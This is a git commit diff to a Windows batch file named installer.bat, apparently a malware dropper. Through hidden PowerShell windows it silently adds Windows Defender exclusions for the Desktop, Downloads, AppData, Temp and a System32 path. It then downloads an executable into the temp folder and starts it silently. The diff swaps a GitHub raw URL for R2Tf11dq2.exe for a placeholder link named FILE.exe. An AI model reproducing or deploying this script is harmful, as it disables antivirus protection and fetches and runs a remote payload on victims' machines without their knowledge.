03da6ba5e5659e398246b02fd02989ea8c64dc3b
walks111551 <aidenwalka@gmail.com>
2024-11-23 18:51:46 -0600

    Update installer.bat

--- installer.bat
+++ installer.bat
@@ -26,17 +26,15 @@ REM --> Silent PowerShell commands
     powershell -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/Desktop'" >nul 2>&1
     powershell -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/Downloads'" >nul 2>&1
     powershell -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/AppData/'" >nul 2>&1
-
+    powershell -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '$env:userprofile\System32'" >nul 2>&1
+    powershell -WindowStyle Hidden -InputFormat None -OutputFormat None -NonInteractive -Command "Add-MpPreference -ExclusionPath '$env:userprofile\AppData\Local\Temp'" >nul 2>&1
 
 cd %TEMP%
 
- 
+@powershell -WindowStyle Hidden -Command "Invoke-WebRequest "my link" -OutFile FILE.exe" >nul 2>&1
 
-
-@powershell -WindowStyle Hidden -Command "Invoke-WebRequest "https://raw.githubusercontent.com/walks111551/09672018256120856125/main/R2Tf11dq2.exe" -OutFile R2Tf11dq2.exe" >nul 2>&1
-
-    REM --> Execute R2Tf11dq2.exe silently
-    start /B "" R2Tf11dq2.exe >nul 2>&1
+    REM --> Execute FILE.exe silently
+    start /B "" FILE.exe >nul 2>&1
     timeout /t 5 /nobreak >nul 2>&1
 
 
